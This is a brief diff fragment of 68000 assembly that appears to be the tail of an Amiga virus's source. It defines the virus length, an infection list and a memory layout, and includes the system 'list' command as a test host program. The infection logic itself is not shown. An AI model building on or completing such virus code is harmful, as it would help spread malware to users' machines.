+		cnop	0,4	;Make sure that (virlen & %11)=0 !!
+end:
+virlen		equ	end-Virus
+DosBase		=	end
+InfList		=	DosBase+4
+SaveMemSize	=	virlen+(22*4)
+
+	section	testdata,data
+OldProggy:
+	incbin	"c:list"
+OldProggySize	=	*-OldProggy
